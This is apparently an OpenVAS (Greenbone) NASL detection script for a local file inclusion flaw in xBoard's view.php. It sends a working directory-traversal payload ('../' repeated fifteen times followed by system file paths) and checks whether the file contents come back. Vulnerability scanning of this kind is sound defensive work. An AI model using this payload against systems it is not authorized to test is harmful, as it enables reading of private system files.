if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.803790" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:N/A:P" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2013-12-27 11:30:04 +0530 (Fri, 27 Dec 2013)" );
	script_name( "xBoard Local File Inclusion Vulnerability" );
	script_tag( name: "summary", value: "The host is running xBoard and is prone to Local file inclusion vulnerability." );
	script_tag( name: "vuldetect", value: "Send the crafted HTTP GET request and check is it possible to read
  the system file." );
	script_tag( name: "solution", value: "Ugrade to xBoard 6.5 or later." );
	script_tag( name: "insight", value: "The flaw is due to an improper validation of user-supplied input to the 'post'
  parameter in 'view.php', which allows attackers to read arbitrary files via a ../(dot dot) sequences." );
	script_tag( name: "affected", value: "xBoard versions 5.0, 5.5, 6.0." );
	script_tag( name: "impact", value: "Successful exploitation will allow attackers to read arbitrary files
  on the target system." );
	script_xref( name: "URL", value: "http://cxsecurity.com/issue/WLB-2013120166" );
	script_xref( name: "URL", value: "http://packetstormsecurity.com/files/124589/xboard-lfi.txt" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
xbPort = http_get_port( default: 80 );
if(!http_can_host_php( port: xbPort )){
	exit( 0 );
}
for dir in nasl_make_list_unique( "/", "/xboard", "/xBoard", http_cgi_dirs( port: xbPort ) ) {
	if(dir == "/"){
		dir = "";
	}
	url = dir + "/main.php";
	if(http_vuln_check( port: xbPort, url: url, pattern: ">xBoard<", check_header: TRUE, usecache: TRUE )){
		files = traversal_files();
		for file in keys( files ) {
			url = dir + "/view.php?post=" + crap( data: "../", length: 3 * 15 ) + files[file];
			if(http_vuln_check( port: xbPort, url: url, pattern: file )){
				security_message( port: xbPort );
				exit( 0 );
			}
		}
	}
}
exit( 99 );

